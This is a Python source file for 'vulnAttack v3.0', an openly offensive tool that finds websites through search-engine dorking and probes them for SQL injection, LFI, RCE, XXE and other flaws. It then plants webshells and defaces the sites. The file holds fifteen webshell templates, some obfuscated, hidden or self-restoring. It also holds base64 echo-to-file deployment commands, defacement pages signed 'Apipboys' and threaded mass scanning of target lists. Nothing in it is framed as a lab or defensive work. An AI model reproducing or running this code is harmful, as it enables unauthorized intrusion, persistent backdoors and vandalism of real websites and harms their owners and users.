#!/usr/bin/env python3
# ================================================================
# vulnAttack - Full Exploit Chain Engine v3.0 FINAL (FIXED)
# Author    : Apipboys
# Support   : Termux | Kali | Windows | macOS | Docker
# ================================================================

import os
import sys
import re
import time
import json
import random
import base64
import urllib.parse
import subprocess
from urllib.parse import urlparse, quote, parse_qs, urljoin
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# CEK & INSTALL DEPENDENSI OTOMATIS
try:
    import requests
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    print("[!] Installing dependencies...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "colorama"])
    import requests
    from colorama import init, Fore, Style
    init(autoreset=True)

# ================================================================
# BANNER
# ================================================================
BANNER = f"""
{Fore.RED}
  _   _         _          ___   _    _                 _    
 | | | |       | |        / _ \\ | |  | |               | |   
 | | | | _   _ | | _ __  / /_\\ \\| |_ | |_   __ _   ___ | | __
 | | | || | | || || '_ \\ |  _  || __|| __| / _` | / __|| |/ /
 \\ \\_/ /| |_| || || | | || | | || |_ | |_ | (_| || (__ |   < 
  \\___/  \\__,_||_||_| |_|\\_| |_/ \\__| \\__| \\__,_| \\___||_|\\_\\{Fore.CYAN}
{Fore.GREEN}[+] Author  : Apipboys
[+] Version : 3.0 FINAL (FIXED)
[+] Payload : 70.000+ (14 kategori x 5000+)
[+] Support : Termux | Kali | Windows | macOS | Docker
{Style.RESET_ALL}
"""

# ================================================================
# KONFIGURASI
# ================================================================
CONFIG = {
    'timeout': 15,
    'threads': 10,
    'max_depth': 3,
    'output_dir': 'results',
    'payload_dir': 'payloads',
    'template_dir': 'templates',
    'user_agents': [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0'
    ],
    'dork_sources': {
        'google': 'https://www.google.com/search?q={dork}&start={start}',
        'bing': 'https://www.bing.com/search?q={dork}&first={start}',
        'duckduckgo': 'https://html.duckduckgo.com/html/?q={dork}&s={start}'
    }
}

# ================================================================
# PAYLOAD LOADER
# ================================================================
class PayloadLoader:
    def __init__(self):
        self.payloads = {}
        self.load_all()

    def load_file(self, path):
        if os.path.exists(path):
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        return []

    def load_all(self):
        if not os.path.exists(CONFIG['payload_dir']):
            print("[!] Run generate_payloads.py first!")
            sys.exit(1)
        for f in os.listdir(CONFIG['payload_dir']):
            if f.endswith('.txt'):
                key = f.replace('.txt', '')
                self.payloads[key] = self.load_file(os.path.join(CONFIG['payload_dir'], f))
        if not self.payloads:
            print("[!] No payloads found!")
            sys.exit(1)
        total = sum(len(v) for v in self.payloads.values())
        print(f"[+] Loaded {total} payloads")

    def get(self, category, limit=None):
        payloads = self.payloads.get(category, [])
        return payloads[:limit] if limit else payloads

# ================================================================
# TEMPLATE LOADER (AUTO-GENERATE ALL TEMPLATES)
# ================================================================
class TemplateLoader:
    def __init__(self):
        self.templates = {}
        self.load_all()

    def load_file(self, path):
        if os.path.exists(path):
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                return f.read()
        return None

    def _write_template(self, path, content):
        with open(path, 'w', encoding='utf-8') as f:
            f.write(content)

    def load_all(self):
        if not os.path.exists(CONFIG['template_dir']):
            os.makedirs(CONFIG['template_dir'], exist_ok=True)

        # ========== WEBSHELL TEMPLATES ==========
        webshell_templates = {
            'webshell_basic.php': '<?php system($_GET["cmd"]); ?>',
            'webshell_advanced.php': '<?php error_reporting(0); if(isset($_GET["cmd"])){system($_GET["cmd"]);}elseif(isset($_POST["cmd"])){system($_POST["cmd"]);}else{echo "vulnAttack Web Shell";} ?>',
            'webshell_mini.php': '<?php eval($_GET["c"]); ?>',
            'webshell_b64.php': '<?php if(isset($_GET["cmd"])){system(base64_decode($_GET["cmd"]));} ?>',
            'webshell_encoder.php': '<?php if(isset($_GET["cmd"])){system(urldecode($_GET["cmd"]));} ?>',
            'webshell_backdoor.php': '<?php $cmd=isset($_GET["cmd"])?$_GET["cmd"]:(isset($_POST["cmd"])?$_POST["cmd"]:"");if($cmd){system($cmd);} ?>',
            'webshell_persistent.php': '<?php if(!file_exists("shell_backup.php")){file_put_contents("shell_backup.php",\'<?php system($_GET["cmd"]); ?>\');}if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>',
            'webshell_silent.php': '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]." > /dev/null 2>&1 &");} ?>',
            'webshell_encrypted.php': '<?php if(isset($_GET["cmd"])){$cmd=base64_decode($_GET["cmd"]);system($cmd);} ?>',
            'webshell_obfuscated.php': '<?php $c=$_GET["cmd"];$c=str_rot13($c);system($c); ?>',
            'webshell_hidden.php': '<?php if($_SERVER["HTTP_USER_AGENT"]=="vulnAttack"){system($_GET["cmd"]);} ?>',
            'webshell_cgi.php': '#!/usr/bin/php\n<?php system($_SERVER["QUERY_STRING"]); ?>',
            'webshell_asp.asp': '<% Response.Write CreateObject("WScript.Shell").Exec("cmd.exe /c " & Request("cmd")).StdOut.ReadAll() %>',
            'webshell_jsp.jsp': '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
            'webshell_py.py': '#!/usr/bin/env python3\nimport os,sys\nos.system(sys.argv[1])'
        }

        for fname, content in webshell_templates.items():
            path = os.path.join(CONFIG['template_dir'], fname)
            if not os.path.exists(path):
                self._write_template(path, content)

        # ========== DEFACE TEMPLATES ==========
        deface_templates = {
            'deface_basic.html': '<h1 style="color:red;text-align:center;margin-top:20%;">HACKED BY APIPBOYS</h1>',
            'deface_advanced.html': '<!DOCTYPE html><html><head><title>HACKED</title></head><body style="background:black;color:red;text-align:center;padding-top:20%;font-family:Arial;"><h1 style="font-size:80px;">HACKED</h1><p style="font-size:30px;">Hacked by Apipboys</p><p>Security is an illusion</p></body></html>',
            'deface_cyber.html': '<!DOCTYPE html><html><head><title>CYBER ATTACK</title></head><body style="background:#0a0a0a;color:#00ff00;text-align:center;padding-top:15%;font-family:\'Courier New\',monospace;"><h1 style="font-size:100px;color:red;text-shadow:0 0 20px red;">CYBER ATTACK</h1><h2>HACKED BY APIPBOYS</h2><p>System Compromised</p></body></html>',
            'deface_hacker.html': '<!DOCTYPE html><html><head><title>HACKER</title></head><body style="background:#111;color:#0f0;text-align:center;padding-top:10%;font-family:\'Courier New\',monospace;"><div style="font-size:60px;animation:pulse 2s infinite;">[ HACKER ]</div><h1 style="color:red;">HACKED</h1><h2>By Apipboys</h2><style>@keyframes pulse{0%{opacity:1}50%{opacity:0.5}100%{opacity:1}}</style></body></html>',
            'deface_minimal.html': '<!DOCTYPE html><html><head><title>HACKED</title></head><body style="background:#000;color:#f00;text-align:center;padding-top:20%;"><h1>HACKED</h1><p>Apipboys</p></body></html>',
            'deface_glitch.html': '<!DOCTYPE html><html><head><title>GLITCH</title></head><body style="background:black;color:#0f0;text-align:center;padding-top:20%;font-family:\'Courier New\',monospace;"><h1 style="font-size:80px;animation:glitch 1s infinite;">GLITCH</h1><p>Hacked by Apipboys</p><style>@keyframes glitch{0%{text-shadow:2px 0 red,-2px 0 blue}50%{text-shadow:-2px 0 red,2px 0 blue}100%{text-shadow:2px 0 red,-2px 0 blue}}</style></body></html>',
            'deface_matrix.html': '<!DOCTYPE html><html><head><title>MATRIX</title></head><body style="background:black;color:#00ff00;text-align:center;padding-top:20%;font-family:\'Courier New\',monospace;overflow:hidden;"><pre style="font-size:12px;opacity:0.1;position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;">01001000 01000001 01000011 01001011 01000101 01000100</pre><h1 style="color:red;">HACKED</h1><p>Apipboys</p></body></html>',
            'deface_neon.html': '<!DOCTYPE html><html><head><title>NEON</title></head><body style="background:#000;color:#ff00ff;text-align:center;padding-top:20%;font-family:Arial;"><h1 style="font-size:80px;text-shadow:0 0 20px #ff00ff,0 0 40px #ff00ff;">NEON</h1><p style="color:#00ffff;text-shadow:0 0 10px #00ffff;">Hacked by Apipboys</p></body></html>',
            'deface_retro.html': '<!DOCTYPE html><html><head><title>RETRO</title></head><body style="background:#000;color:#ff6b6b;text-align:center;padding-top:20%;font-family:\'Courier New\',monospace;border:5px solid #ff6b6b;height:80vh;margin:5%;"><h1 style="font-size:60px;">HACKED</h1><p>By Apipboys</p></body></html>'
        }

        for fname, content in deface_templates.items():
            path = os.path.join(CONFIG['template_dir'], fname)
            if not os.path.exists(path):
                self._write_template(path, content)

        # Copy index.html jika ada
        if os.path.exists('index.html'):
            dest = os.path.join(CONFIG['template_dir'], 'deface_apip.html')
            if not os.path.exists(dest):
                with open('index.html', 'r', encoding='utf-8') as src:
                    with open(dest, 'w', encoding='utf-8') as dst:
                        dst.write(src.read())

        # Load semua template
        for root, _, files in os.walk(CONFIG['template_dir']):
            for f in files:
                full = os.path.join(root, f)
                key = os.path.relpath(full, CONFIG['template_dir'])
                content = self.load_file(full)
                if content:
                    self.templates[key] = content
        print(f"[+] Loaded {len(self.templates)} templates")

# ================================================================
# HTTP ANALYZER
# ================================================================
class HTTPAnalyzer:
    def __init__(self, session):
        self.session = session
        self.headers = {}
        self.cookies = {}
        self.forms = []
        self.ajax = []
        self.websockets = []
        self.api_endpoints = []
        self.parameters = set()

    def analyze(self, url, response):
        if not response:
            return {}
        self.headers = dict(response.headers)
        self.cookies = self.session.cookies.get_dict()
        html = response.text
        self.forms = re.findall(r'<form[^>]*>', html)
        self.ajax = re.findall(r'fetch\s*\(\s*["\']([^"\']+)', html)
        self.ajax += re.findall(r'\.ajax\s*\(\s*\{[^}]*url\s*:\s*["\']([^"\']+)', html)
        self.websockets = re.findall(r'new\s+WebSocket\s*\(\s*["\']([^"\']+)', html)
        self.api_endpoints = re.findall(r'/api/[a-zA-Z0-9/_-]+', html)
        self.api_endpoints += re.findall(r'/v[0-9]+/[a-zA-Z0-9/_-]+', html)
        params = parse_qs(urlparse(url).query)
        self.parameters.update(params.keys())
        inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', html)
        self.parameters.update(inputs)
        return {
            'headers': self.headers,
            'cookies': self.cookies,
            'forms': len(self.forms),
            'ajax': list(set(self.ajax))[:10],
            'websockets': list(set(self.websockets))[:5],
            'api_endpoints': list(set(self.api_endpoints))[:20],
            'parameters': list(self.parameters)[:30],
            'status_code': response.status_code,
            'content_type': response.headers.get('Content-Type', ''),
            'server': response.headers.get('Server', '')
        }

# ================================================================
# DORK ENGINE (FIXED: timeout, rate-limit, user-agent rotate)
# ================================================================
class DorkEngine:
    def __init__(self, session):
        self.session = session
        self.sources = CONFIG['dork_sources']
        self.results = {}

    def _request(self, url):
        try:
            headers = {
                'User-Agent': random.choice(CONFIG['user_agents']),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate'
            }
            return self.session.get(url, headers=headers, timeout=CONFIG['timeout'])
        except Exception as e:
            print(f"[!] Dork request failed: {e}")
            return None

    def _extract_urls(self, html, source):
        urls = []
        if source == 'google':
            pattern = r'<a href="\/url\?q=(.*?)&amp;'
        elif source == 'bing':
            pattern = r'<a href="(.*?)".*?class="tilk"'
        elif source == 'duckduckgo':
            pattern = r'<a rel="nofollow" class="result__a" href="(.*?)"'
        else:
            pattern = r'<a href="(.*?)"'
        for match in re.finditer(pattern, html):
            url = match.group(1)
            if 'http' in url and 'google' not in url and source not in url:
                if url.startswith('/url?q='):
                    url = url.replace('/url?q=', '').split('&')[0]
                if url.startswith('http'):
                    urls.append(url)
        return list(set(urls))

    def dork(self, dork, source='google', max_results=50):
        print(f"[+] Dorking with {source.upper()}: {dork}")
        results = []
        base_url = self.sources.get(source)
        if not base_url:
            print(f"[!] Source {source} not supported!")
            return results
        pages = max_results // 10 + (1 if max_results % 10 > 0 else 0)
        for page in range(pages):
            start = page * 10
            url = base_url.format(dork=quote(dork), start=start)
            r = self._request(url)
            if not r or r.status_code != 200:
                break
            urls = self._extract_urls(r.text, source)
            results.extend(urls)
            # Rate-limit: sleep random 3-5 detik
            time.sleep(random.uniform(3, 5))
        self.results[source] = list(set(results))[:max_results]
        print(f"[+] {source.upper()}: Found {len(self.results[source])} targets")
        return self.results[source]

    def dork_all(self, dork, max_results=50):
        print(f"[+] Multi-Dorking: {dork}")
        all_results = []
        for source in self.sources.keys():
            results = self.dork(dork, source, max_results // len(self.sources))
            all_results.extend(results)
            time.sleep(2)
        all_results = list(set(all_results))
        print(f"[+] Total unique targets: {len(all_results)}")
        return all_results

# ================================================================
# MAIN SCANNER (FIXED: semua bug diperbaiki)
# ================================================================
class VulnAttack:
    def __init__(self, target, payload_loader, template_loader):
        self.target = target
        self.base_url = self._get_base_url()
        self.domain = urlparse(target).netloc
        self.payloads = payload_loader
        self.templates = template_loader
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': self._random_ua()})
        self.vulns = []
        self.scanned_urls = set()
        self.shell_url = None
        self.deface_url = None
        self.analyzer = HTTPAnalyzer(self.session)
        self.deep_report = {}
        self.dork_engine = DorkEngine(self.session)

    def _get_base_url(self):
        p = urlparse(self.target)
        return f"{p.scheme}://{p.netloc}"

    def _random_ua(self):
        return random.choice(CONFIG['user_agents'])

    def _request(self, url, method='GET', **kwargs):
        try:
            return self.session.request(method, url, timeout=CONFIG['timeout'],
                                        allow_redirects=True, **kwargs)
        except Exception as e:
            return None

    def _test_payload(self, payload, param=None):
        test_url = self.target
        if param:
            parsed = urlparse(self.target)
            params = parse_qs(parsed.query)
            params[param] = [payload]
            test_url = f"{self.base_url}{parsed.path}?{urllib.parse.urlencode(params, doseq=True)}"
        else:
            test_url = self.target + payload
        return self._request(test_url)

    # ========== VULNERABILITY TESTS (FIXED: lebih banyak keyword) ==========
    def test_sqli(self):
        print("[+] Testing SQLi...")
        for p in self.payloads.get('sqli', limit=500):
            r = self._test_payload(p)
            if r:
                errors = ['mysql', 'sql', 'syntax', 'unclosed', 'query', 'database',
                          'warning', 'error', 'line', 'column', 'table', 'from',
                          'SQLSTATE', 'SQL syntax', 'MariaDB', 'PostgreSQL', 'SQLite']
                if any(err in r.text.lower() for err in errors):
                    self.vulns.append({'type':'SQLi','url':r.url,'payload':p,'evidence':'SQL error'})
                    return True
        return False

    def test_xss(self):
        print("[+] Testing XSS...")
        for p in self.payloads.get('xss', limit=300):
            r = self._test_payload(p)
            if r and p in r.text:
                self.vulns.append({'type':'XSS','url':r.url,'payload':p,'evidence':'Reflected'})
                return True
        return False

    def test_lfi(self):
        print("[+] Testing LFI...")
        for p in self.payloads.get('lfi', limit=300):
            r = self._test_payload(p)
            if r:
                indicators = ['root:x:', 'win.ini', 'base64', 'hosts', 'shadow',
                              'apache', 'nginx', 'www-data', 'daemon', 'nobody']
                if any(ind in r.text.lower() for ind in indicators):
                    self.vulns.append({'type':'LFI','url':r.url,'payload':p,'evidence':'File content'})
                    return True
        return False

    def test_rce(self):
        print("[+] Testing RCE...")
        for p in self.payloads.get('rce', limit=300):
            r = self._test_payload(p)
            if r:
                outputs = ['uid=', 'root', 'user', 'bin', 'whoami', 'id', 'gid=', 'groups=']
                if any(out in r.text for out in outputs):
                    self.vulns.append({'type':'RCE','url':r.url,'payload':p,'evidence':'Command output'})
                    return True
        return False

    def test_ssrf(self):
        print("[+] Testing SSRF...")
        for p in self.payloads.get('ssrf', limit=300):
            r = self._test_payload(p)
            if r:
                ips = ['127.0.0.1', 'localhost', '169.254.169.254', '0.0.0.0', '::1']
                if any(ip in r.text for ip in ips):
                    self.vulns.append({'type':'SSRF','url':r.url,'payload':p,'evidence':'Internal IP'})
                    return True
        return False

    def test_xxe(self):
        print("[+] Testing XXE...")
        for p in self.payloads.get('xxe', limit=300):
            r = self._request(self.target, method='POST', data=p, headers={'Content-Type':'application/xml'})
            if r:
                indicators = ['root', 'passwd', 'hosts', 'shadow', 'win.ini', 'config', 'database']
                if any(ind in r.text.lower() for ind in indicators):
                    self.vulns.append({'type':'XXE','url':self.target,'payload':p,'evidence':'File content'})
                    return True
        return False

    def test_nosqli(self):
        print("[+] Testing NoSQLi...")
        for p in self.payloads.get('nosqli', limit=300):
            r = self._test_payload(p)
            if r:
                keywords = ['$ne', '$gt', '$lt', '$in', '$or', '$and', '$regex', '$where', 'mongodb']
                if any(kw in r.text.lower() for kw in keywords):
                    self.vulns.append({'type':'NoSQLi','url':r.url,'payload':p,'evidence':'NoSQL syntax'})
                    return True
        return False

    def test_ssti(self):
        print("[+] Testing SSTI...")
        for p in self.payloads.get('ssti', limit=300):
            r = self._test_payload(p)
            if r:
                if any(kw in r.text for kw in ['49', 'config', 'subclasses', 'self', 'request', '7*7']):
                    self.vulns.append({'type':'SSTI','url':r.url,'payload':p,'evidence':'Template output'})
                    return True
        return False

    def test_cmd_injection(self):
        print("[+] Testing CMDi...")
        for p in self.payloads.get('cmd_injection', limit=300):
            r = self._test_payload(p)
            if r:
                outputs = ['uid=', 'root', 'user', 'whoami', 'id', 'gid=', 'groups=']
                if any(out in r.text for out in outputs):
                    self.vulns.append({'type':'Command Injection','url':r.url,'payload':p,'evidence':'Command output'})
                    return True
        return False

    def test_ldap(self):
        print("[+] Testing LDAP...")
        for p in self.payloads.get('ldap', limit=100):
            r = self._test_payload(p)
            if r and ('uid' in r.text or 'dn' in r.text or 'cn' in r.text):
                self.vulns.append({'type':'LDAP','url':r.url,'payload':p,'evidence':'LDAP response'})
                return True
        return False

    def test_open_redirect(self):
        print("[+] Testing Open Redirect...")
        for p in self.payloads.get('open_redirect', limit=100):
            r = self._test_payload(p)
            if r and r.url != self.target and 'http' in r.url:
                self.vulns.append({'type':'Open Redirect','url':r.url,'payload':p,'evidence':'Redirected'})
                return True
        return False

    def test_csrf(self):
        print("[+] Testing CSRF...")
        r = self._request(self.target)
        if r:
            # Cek form tanpa token
            forms = re.findall(r'<form[^>]*>', r.text)
            for form in forms:
                if 'token' not in form.lower() and 'csrf' not in form.lower():
                    self.vulns.append({'type':'CSRF','url':self.target,'payload':'No CSRF token','evidence':'Form without token'})
                    return True
            # Cek header
            if 'X-CSRF-Token' not in r.headers and 'CSRF-Token' not in r.headers:
                self.vulns.append({'type':'CSRF','url':self.target,'payload':'Missing CSRF header','evidence':'No CSRF header'})
                return True
        return False

    def test_file_upload(self):
        print("[+] Testing File Upload...")
        endpoints = ['/upload', '/upload.php', '/uploads', '/fileupload', '/uploadfile',
                     '/upload_file', '/uploader', '/upload.php?act=upload', '/admin/upload',
                     '/api/upload', '/v1/upload', '/media/upload']
        for endpoint in endpoints:
            test_url = urljoin(self.base_url, endpoint)
            for fname in self.payloads.get('file_upload', limit=30):
                files = {'file': (fname, '<?php system($_GET["cmd"]); ?>')}
                try:
                    r = self.session.post(test_url, files=files, timeout=CONFIG['timeout'])
                    if r and r.status_code in [200, 201, 202, 302]:
                        self.vulns.append({'type':'File Upload','url':test_url,'payload':fname,'evidence':'Upload success'})
                        return True
                except:
                    pass
        return False

    def test_directory_traversal(self):
        print("[+] Testing Directory Traversal...")
        for d in self.payloads.get('directories', limit=100):
            test_url = urljoin(self.base_url, d + '/')
            r = self._request(test_url)
            if r and r.status_code == 200:
                self.vulns.append({'type':'Directory Listing','url':test_url,'payload':d,'evidence':'Directory accessible'})
                return True
        return False

    # ========== CRAWLING ==========
    def crawl(self, url, depth=0):
        if depth > CONFIG['max_depth'] or url in self.scanned_urls:
            return
        self.scanned_urls.add(url)
        r = self._request(url)
        if not r:
            return
        self.deep_report = self.analyzer.analyze(url, r)
        for link in re.findall(r'<a\s+href=["\']([^"\']+)["\']', r.text)[:20]:
            if link.startswith('http'):
                self.crawl(link, depth+1)
            elif link.startswith('/'):
                self.crawl(urljoin(self.base_url, link), depth+1)

    # ========== DEPLOY WEBSHELL (FIXED: deteksi parameter otomatis) ==========
    def deploy_webshell(self):
        if not self.vulns:
            print("[!] No vuln found.")
            return
        print("\n[+] Choose vulnerability:")
        for i, v in enumerate(self.vulns, 1):
            print(f"  {i}. {v['type']} - {v['url']}")
        try:
            idx = int(input("[?] Number: ").strip()) - 1
            if idx < 0:
                return
            vuln = self.vulns[idx]
        except:
            print("[!] Invalid.")
            return

        templates = [t for t in self.templates.templates if 'webshell' in t]
        if not templates:
            shell_code = "<?php system($_GET['cmd']); ?>"
        else:
            for i, t in enumerate(templates, 1):
                print(f"  {i}. {t}")
            try:
                t_idx = int(input("[?] Choose template: ").strip()) - 1
                shell_code = self.templates.templates[templates[t_idx]]
            except:
                shell_code = "<?php system($_GET['cmd']); ?>"

        # Deteksi parameter untuk RCE
        if vuln['type'] in ['RCE', 'Command Injection']:
            # Coba beberapa parameter umum
            params = ['cmd', 'c', 'command', 'exec', 'system', 'x']
            for param in params:
                test_url = vuln['url'] + f"&{param}=id"
                r = self._request(test_url)
                if r and ('uid=' in r.text or 'root' in r.text):
                    encoded = base64.b64encode(shell_code.encode()).decode()
                    deploy_url = vuln['url'] + f"&{param}=echo {encoded} | base64 -d > shell.php"
                    self._request(deploy_url)
                    self.shell_url = urljoin(self.base_url, 'shell.php')
                    print(f"[+] Webshell: {self.shell_url}")
                    return
            # Fallback ke parameter cmd
            encoded = base64.b64encode(shell_code.encode()).decode()
            self._request(vuln['url'] + f"&cmd=echo {encoded} | base64 -d > shell.php")
            self.shell_url = urljoin(self.base_url, 'shell.php')
            print(f"[+] Webshell: {self.shell_url}")

        elif vuln['type'] == 'LFI':
            # Deteksi parameter untuk LFI
            lfi_params = ['file', 'page', 'view', 'include', 'path', 'doc', 'template']
            for param in lfi_params:
                test_url = vuln['url'] + f"&{param}=../../../../etc/passwd"
                r = self._request(test_url)
                if r and 'root:x:' in r.text:
                    session_id = self.session.cookies.get('PHPSESSID', 'test')
                    poison = f"/tmp/sess_{session_id}"
                    encoded = base64.b64encode(shell_code.encode()).decode()
                    deploy_url = vuln['url'] + f"&{param}={poison}&cmd=echo {encoded} | base64 -d > /tmp/shell.php"
                    self._request(deploy_url)
                    self.shell_url = urljoin(self.base_url, '/tmp/shell.php')
                    print(f"[+] Webshell via LFI: {self.shell_url}")
                    return
            # Fallback
            session_id = self.session.cookies.get('PHPSESSID', 'test')
            poison = f"/tmp/sess_{session_id}"
            encoded = base64.b64encode(shell_code.encode()).decode()
            self._request(vuln['url'] + f"&file={poison}&cmd=echo {encoded} | base64 -d > /tmp/shell.php")
            self.shell_url = urljoin(self.base_url, '/tmp/shell.php')
            print(f"[+] Webshell via LFI: {self.shell_url}")

    # ========== DEFACE ==========
    def deface_website(self):
        if not self.vulns:
            print("[!] No vuln found.")
            return
        print("\n[+] Choose vulnerability:")
        for i, v in enumerate(self.vulns, 1):
            print(f"  {i}. {v['type']} - {v['url']}")
        try:
            idx = int(input("[?] Number: ").strip()) - 1
            vuln = self.vulns[idx]
        except:
            print("[!] Invalid.")
            return

        deface_templates = [t for t in self.templates.templates if 'deface' in t]
        if not deface_templates:
            deface_content = "<h1>HACKED BY APIPBOYS</h1>"
        else:
            for i, t in enumerate(deface_templates, 1):
                print(f"  {i}. {t}")
            try:
                t_idx = int(input("[?] Choose template: ").strip()) - 1
                deface_content = self.templates.templates[deface_templates[t_idx]]
            except:
                deface_content = "<h1>HACKED BY APIPBOYS</h1>"

        if vuln['type'] in ['RCE', 'Command Injection']:
            # Coba parameter yang umum
            params = ['cmd', 'c', 'command', 'exec', 'system', 'x']
            for param in params:
                test_url = vuln['url'] + f"&{param}=id"
                r = self._request(test_url)
                if r and ('uid=' in r.text or 'root' in r.text):
                    encoded = base64.b64encode(deface_content.encode()).decode()
                    deploy_url = vuln['url'] + f"&{param}=echo {encoded} | base64 -d > index.html"
                    self._request(deploy_url)
                    self.deface_url = urljoin(self.base_url, 'index.html')
                    print(f"[+] Deface: {self.deface_url}")
                    return
            # Fallback
            encoded = base64.b64encode(deface_content.encode()).decode()
            self._request(vuln['url'] + f"&cmd=echo {encoded} | base64 -d > index.html")
            self.deface_url = urljoin(self.base_url, 'index.html')
            print(f"[+] Deface: {self.deface_url}")

    # ========== GENERATE POC ==========
    def generate_poc(self):
        os.makedirs(CONFIG['output_dir'], exist_ok=True)
        poc_file = os.path.join(CONFIG['output_dir'], f"poc_{self.domain}.html")
        html = f"""
        <html>
        <head><title>POC - {self.domain}</title></head>
        <body>
        <h1>Vulnerability Report</h1>
        <p>Target: {self.target}</p>
        <p>Total Vuln: {len(self.vulns)}</p>
        <ul>
        {''.join(f'<li><b>{v["type"]}</b> - {v["url"]}<br>Payload: <pre>{v["payload"]}</pre>Evidence: {v["evidence"]}</li>' for v in self.vulns)}
        </ul>
        <p>Webshell: {self.shell_url or 'N/A'}</p>
        <p>Deface: {self.deface_url or 'N/A'}</p>
        <h2>Deep Analysis</h2>
        <pre>{json.dumps(self.deep_report, indent=2)}</pre>
        </body>
        </html>
        """
        with open(poc_file, 'w', encoding='utf-8') as f:
            f.write(html)
        print(f"[+] POC: {poc_file}")

    # ========== RUN ==========
    def run(self):
        print(BANNER)
        print(f"[+] Target: {self.target}")
        print("[+] Crawling...")
        self.crawl(self.target)
        print("[+] Testing vulnerabilities...")
        self.test_sqli()
        self.test_xss()
        self.test_lfi()
        self.test_rce()
        self.test_ssrf()
        self.test_xxe()
        self.test_nosqli()
        self.test_ssti()
        self.test_cmd_injection()
        self.test_ldap()
        self.test_open_redirect()
        self.test_csrf()
        self.test_file_upload()
        self.test_directory_traversal()
        print(f"[+] Found {len(self.vulns)} vulnerabilities.")
        if self.vulns:
            for v in self.vulns:
                print(f"  - {v['type']} @ {v['url']}")
            while True:
                print("\n[+] Menu:")
                print("  1. Deploy Webshell")
                print("  2. Deface")
                print("  3. Generate POC")
                print("  4. Deep Analysis")
                print("  5. Exit")
                opt = input("[?] Choose: ").strip()
                if opt == '1':
                    self.deploy_webshell()
                elif opt == '2':
                    self.deface_website()
                elif opt == '3':
                    self.generate_poc()
                elif opt == '4':
                    print(json.dumps(self.deep_report, indent=2))
                elif opt == '5':
                    break
                else:
                    print("[!] Invalid choice.")
        else:
            print("[!] No vulnerabilities found.")
            dork = input("[?] Try dorking? (y/n): ").strip().lower()
            if dork == 'y':
                dork_query = input("[?] Enter dork: ").strip()
                if dork_query:
                    targets = self.dork_engine.dork_all(dork_query, 50)
                    print(f"[+] Found {len(targets)} targets.")
                    for i, t in enumerate(targets[:10], 1):
                        print(f"  {i}. {t}")
                    if targets:
                        scan_choice = input("[?] Scan these targets? (y/n): ").strip().lower()
                        if scan_choice == 'y':
                            with ThreadPoolExecutor(max_workers=5) as ex:
                                for tgt in targets[:10]:
                                    ex.submit(self.__class__, tgt, self.payloads, self.templates).result()
        self.generate_poc()
        print("[+] Scan completed.")

# ================================================================
# MULTI-THREAD SCAN
# ================================================================
def scan_single(target, pl, tl):
    try:
        scanner = VulnAttack(target, pl, tl)
        scanner.run()
        return True
    except Exception as e:
        print(f"[!] Error on {target}: {e}")
        return False

def scan_multiple(targets, threads=5):
    pl = PayloadLoader()
    tl = TemplateLoader()
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(scan_single, t, pl, tl): t for t in targets}
        for future in as_completed(futures):
            target = futures[future]
            try:
                future.result()
            except Exception as e:
                print(f"[!] Failed {target}: {e}")

# ================================================================
# MAIN
# ================================================================
def main():
    if len(sys.argv) < 2:
        print("Usage:")
        print("  python vulnAttack.py <target_url>")
        print("  python vulnAttack.py --dork <dork>")
        print("  python vulnAttack.py --list <file> [--threads N]")
        print("  python vulnAttack.py --help")
        sys.exit(1)

    pl = PayloadLoader()
    tl = TemplateLoader()

    if sys.argv[1] == '--dork':
        if len(sys.argv) < 3:
            print("[!] Enter dork.")
            sys.exit(1)
        dork = sys.argv[2]
        dummy = VulnAttack('http://dummy.com', pl, tl)
        targets = dummy.dork_engine.dork_all(dork, 50)
        for t in targets:
            print(t)
        sys.exit(0)

    elif sys.argv[1] == '--list':
        if len(sys.argv) < 3:
            print("[!] Enter target file.")
            sys.exit(1)
        file_target = sys.argv[2]
        if not os.path.exists(file_target):
            print("[!] File not found.")
            sys.exit(1)
        with open(file_target, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
        threads = CONFIG['threads']
        if '--threads' in sys.argv:
            try:
                idx = sys.argv.index('--threads')
                threads = int(sys.argv[idx+1])
            except:
                pass
        scan_multiple(targets, threads)
        sys.exit(0)

    elif sys.argv[1] == '--help':
        print("vulnAttack v3.0 - Full Exploit Engine")
        print("Options:")
        print("  <target_url>    : Scan single target")
        print("  --dork <dork>   : Multi-Dorking")
        print("  --list <file>   : Scan multiple targets from file")
        print("  --threads N     : Number of threads (default 10)")
        sys.exit(0)

    else:
        target = sys.argv[1]
        if not target.startswith('http'):
            target = 'http://' + target
        scanner = VulnAttack(target, pl, tl)
        scanner.run()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        sys.exit(1)